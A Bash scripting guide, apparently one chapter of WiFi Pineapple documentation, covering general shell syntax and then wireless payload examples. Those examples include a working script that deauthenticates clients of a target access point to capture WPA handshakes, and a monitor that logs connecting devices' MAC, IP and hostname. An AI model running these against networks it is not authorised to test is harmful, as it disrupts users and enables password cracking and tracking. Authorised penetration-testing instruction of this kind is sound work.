# Bash Scripting for WiFi Pineapple

## Overview

This guide covers Bash scripting specifically for WiFi Pineapple payload development, from basics to advanced techniques.

---

## Script Structure

### Standard Template

```bash
#!/bin/bash
#
# Payload: PP-XXX
# Name: Payload Name
# Description: What this payload does
# Author: Your Name
# Version: 1.0
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan1"
OUTPUT_DIR="/sd/loot"
LOG_FILE="/tmp/payload.log"

# ============================================
# FUNCTIONS
# ============================================
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleaning up..."
    # Cleanup code here
    exit 0
}

# Trap signals for cleanup
trap cleanup SIGINT SIGTERM EXIT

# ============================================
# VALIDATION
# ============================================
# Check dependencies
for cmd in airmon-ng airodump-ng; do
    command -v $cmd >/dev/null 2>&1 || {
        log "ERROR: $cmd not found"
        exit 1
    }
done

# ============================================
# MAIN
# ============================================
log "Starting payload..."

# Main code here

log "Payload complete"
exit 0
```

---

## Variables

### Declaration & Usage

```bash
# String variables
NAME="value"
echo "$NAME"          # With quotes (safe)
echo $NAME            # Without quotes (unsafe)

# Numbers
COUNT=0
COUNT=$((COUNT + 1))  # Arithmetic
echo $COUNT

# Arrays
TARGETS=("target1" "target2" "target3")
echo "${TARGETS[0]}"  # First element
echo "${TARGETS[@]}"  # All elements
echo "${#TARGETS[@]}" # Array length

# Command output
DATE=$(date '+%Y%m%d')
FILES=$(ls /tmp)

# Default values
VALUE="${1:-default}"        # Use default if $1 is empty
VALUE="${1:=default}"        # Set and use default
VALUE="${VAR:-$(hostname)}"  # Command as default
```

### Special Variables

```bash
$0          # Script name
$1, $2...   # Positional arguments
$#          # Number of arguments
$@          # All arguments (separate)
$*          # All arguments (single string)
$$          # Script PID
$?          # Last command exit status
$!          # Last background process PID
```

---

## Control Structures

### If Statements

```bash
# Basic if
if [ condition ]; then
    # code
fi

# If-else
if [ condition ]; then
    # code
else
    # code
fi

# If-elif-else
if [ condition1 ]; then
    # code
elif [ condition2 ]; then
    # code
else
    # code
fi
```

### Conditions

```bash
# String comparisons
[ "$a" = "$b" ]      # Equal
[ "$a" != "$b" ]     # Not equal
[ -z "$a" ]          # Empty
[ -n "$a" ]          # Not empty

# Numeric comparisons
[ "$a" -eq "$b" ]    # Equal
[ "$a" -ne "$b" ]    # Not equal
[ "$a" -lt "$b" ]    # Less than
[ "$a" -le "$b" ]    # Less or equal
[ "$a" -gt "$b" ]    # Greater than
[ "$a" -ge "$b" ]    # Greater or equal

# File tests
[ -e "$file" ]       # Exists
[ -f "$file" ]       # Is file
[ -d "$dir" ]        # Is directory
[ -r "$file" ]       # Readable
[ -w "$file" ]       # Writable
[ -x "$file" ]       # Executable
[ -s "$file" ]       # Not empty

# Logical operators
[ cond1 ] && [ cond2 ]   # AND
[ cond1 ] || [ cond2 ]   # OR
[ ! condition ]          # NOT
```

### Loops

```bash
# For loop
for item in list; do
    echo "$item"
done

# For loop with range
for i in {1..10}; do
    echo "$i"
done

# C-style for
for ((i=0; i<10; i++)); do
    echo "$i"
done

# While loop
while [ condition ]; do
    # code
done

# Until loop
until [ condition ]; do
    # code
done

# Read lines from file
while IFS= read -r line; do
    echo "$line"
done < file.txt

# Infinite loop
while true; do
    # code
    sleep 1
done
```

### Case Statement

```bash
case "$variable" in
    pattern1)
        # code
        ;;
    pattern2|pattern3)
        # code
        ;;
    *)
        # default
        ;;
esac
```

---

## Functions

### Definition & Usage

```bash
# Simple function
my_function() {
    echo "Hello from function"
}

# With arguments
greet() {
    local name="$1"
    echo "Hello, $name"
}

# With return value
get_count() {
    local count=$(ls | wc -l)
    echo "$count"  # Return via echo
}

# Usage
my_function
greet "World"
COUNT=$(get_count)

# Return codes
check_file() {
    if [ -f "$1" ]; then
        return 0  # Success
    else
        return 1  # Failure
    fi
}

if check_file "/etc/passwd"; then
    echo "File exists"
fi
```

### Local Variables

```bash
my_function() {
    local local_var="only in function"
    GLOBAL_VAR="accessible outside"
}
```

---

## Input/Output

### Echo & Printf

```bash
# Echo
echo "Simple text"
echo -n "No newline"
echo -e "Tab:\tNewline:\n"

# Printf (more control)
printf "Name: %s, Count: %d\n" "$NAME" "$COUNT"
printf "%-20s %10d\n" "Item" 42  # Padding
```

### Reading Input

```bash
# Read from user
read -p "Enter name: " NAME

# Read with timeout
read -t 5 -p "Quick! " ANSWER

# Read silently (passwords)
read -s -p "Password: " PASS

# Read into array
read -a ARRAY <<< "one two three"
```

### Redirection

```bash
# Output
echo "text" > file.txt    # Overwrite
echo "text" >> file.txt   # Append

# Input
cat < file.txt

# Stderr
command 2> errors.txt
command 2>&1              # Stderr to stdout
command &> all.txt        # Both to file

# Pipes
command1 | command2

# Here document
cat << EOF
Multi-line
text here
EOF

# Here string
command <<< "input string"
```

---

## Text Processing

### grep

```bash
# Basic search
grep "pattern" file.txt

# Regex
grep -E "pattern1|pattern2" file.txt

# Case insensitive
grep -i "pattern" file.txt

# Line numbers
grep -n "pattern" file.txt

# Count matches
grep -c "pattern" file.txt

# Files only
grep -l "pattern" *.txt

# Invert match
grep -v "pattern" file.txt
```

### sed

```bash
# Replace first occurrence
sed 's/old/new/' file.txt

# Replace all occurrences
sed 's/old/new/g' file.txt

# In-place edit
sed -i 's/old/new/g' file.txt

# Delete lines
sed '/pattern/d' file.txt

# Print specific lines
sed -n '5,10p' file.txt
```

### awk

```bash
# Print column
awk '{print $1}' file.txt

# With delimiter
awk -F',' '{print $1}' file.csv

# Condition
awk '$3 > 100 {print $1}' file.txt

# Sum column
awk '{sum += $1} END {print sum}' file.txt

# Multiple actions
awk 'BEGIN {print "Start"} {print $0} END {print "End"}' file.txt
```

### cut

```bash
# By column position
cut -c1-5 file.txt

# By delimiter
cut -d',' -f1,3 file.csv

# Multiple fields
cut -d':' -f1,3,5 /etc/passwd
```

---

## Process Management

### Background & Foreground

```bash
# Run in background
command &

# Get background PID
command &
PID=$!

# Wait for background process
wait $PID

# Kill process
kill $PID
kill -9 $PID    # Force kill

# List background jobs
jobs

# Bring to foreground
fg %1
```

### Process Control

```bash
# Check if running
pgrep -f "process_name"
pidof process_name

# Kill by name
pkill -f "pattern"
killall process_name

# Run with timeout
timeout 30 command

# Ignore hangup
nohup command &

# Check exit status
if command; then
    echo "Success"
else
    echo "Failed with code: $?"
fi
```

---

## Wireless Payload Examples

### Network Scanner

```bash
#!/bin/bash
# Scan and save networks

scan_networks() {
    local interface="$1"
    local duration="${2:-30}"
    local output="/tmp/scan_$(date +%s)"

    # Enable monitor
    airmon-ng start "$interface" >/dev/null 2>&1
    local mon="${interface}mon"

    # Scan
    timeout "$duration" airodump-ng \
        -w "$output" \
        -o csv \
        "$mon" >/dev/null 2>&1

    # Disable monitor
    airmon-ng stop "$mon" >/dev/null 2>&1

    # Parse results
    if [ -f "${output}-01.csv" ]; then
        grep -E "^[0-9A-Fa-f]" "${output}-01.csv" | \
            cut -d',' -f1,4,6,14 | \
            while IFS=',' read bssid channel enc ssid; do
                echo "SSID: $ssid | BSSID: $bssid | CH: $channel | ENC: $enc"
            done
    fi

    rm -f "${output}"*
}

scan_networks wlan1 20
```

### Client Monitor

```bash
#!/bin/bash
# Alert on new client connections

INTERFACE="wlan0"
KNOWN_FILE="/tmp/known_clients.txt"
LOOT_DIR="/sd/loot"

touch "$KNOWN_FILE"

monitor_clients() {
    while true; do
        # Get current clients from DHCP leases
        if [ -f /tmp/dnsmasq.leases ]; then
            while read timestamp mac ip hostname clientid; do
                if ! grep -q "$mac" "$KNOWN_FILE"; then
                    # New client!
                    echo "$mac" >> "$KNOWN_FILE"
                    log_client "$mac" "$ip" "$hostname"
                fi
            done < /tmp/dnsmasq.leases
        fi
        sleep 5
    done
}

log_client() {
    local mac="$1"
    local ip="$2"
    local hostname="$3"

    echo "[$(date)] NEW: $mac ($ip) - $hostname" >> "$LOOT_DIR/clients.log"

    # LED notification
    if [ -f /sys/class/leds/pineapple:blue:system/brightness ]; then
        echo 1 > /sys/class/leds/pineapple:blue:system/brightness
        sleep 0.5
        echo 0 > /sys/class/leds/pineapple:blue:system/brightness
    fi
}

monitor_clients
```

### Handshake Capture

```bash
#!/bin/bash
# Capture WPA handshake with auto-deauth

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "Usage: $0 BSSID CHANNEL"
    exit 1
fi

INTERFACE="wlan1"
OUTPUT="/sd/loot/handshake_$(date +%s)"

# Setup
airmon-ng check kill >/dev/null 2>&1
airmon-ng start "$INTERFACE" >/dev/null 2>&1
MON="${INTERFACE}mon"

# Start capture
airodump-ng -c "$TARGET_CHANNEL" \
    --bssid "$TARGET_BSSID" \
    -w "$OUTPUT" \
    "$MON" &
CAP_PID=$!

sleep 10

# Deauth bursts
for i in {1..3}; do
    aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON" >/dev/null 2>&1
    sleep 15
done

# Check for handshake
sleep 5
kill $CAP_PID 2>/dev/null

if aircrack-ng "${OUTPUT}-01.cap" 2>/dev/null | grep -q "handshake"; then
    echo "SUCCESS: Handshake captured!"
    echo "File: ${OUTPUT}-01.cap"
else
    echo "No handshake captured"
fi

# Cleanup
airmon-ng stop "$MON" >/dev/null 2>&1
```

---

## Best Practices

### Error Handling

```bash
# Exit on error
set -e

# Exit on undefined variable
set -u

# Fail on pipe errors
set -o pipefail

# Combine
set -euo pipefail

# Handle errors
command || {
    echo "Command failed"
    exit 1
}
```

### Logging

```bash
LOG_FILE="/tmp/payload.log"

log() {
    local level="${2:-INFO}"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $1" | tee -a "$LOG_FILE"
}

log "Starting"
log "Something went wrong" "ERROR"
log "Debug info" "DEBUG"
```

### Cleanup

```bash
cleanup() {
    # Stop processes
    pkill -f airodump-ng 2>/dev/null

    # Restore interfaces
    airmon-ng stop wlan1mon 2>/dev/null

    # Remove temp files
    rm -f /tmp/payload_*

    exit 0
}

trap cleanup SIGINT SIGTERM EXIT
```

---

[← PineAP Module](05_PineAP_Module.md) | [Back to Fundamentals](README.md) | [Next: API Reference →](07_API_Reference.md)
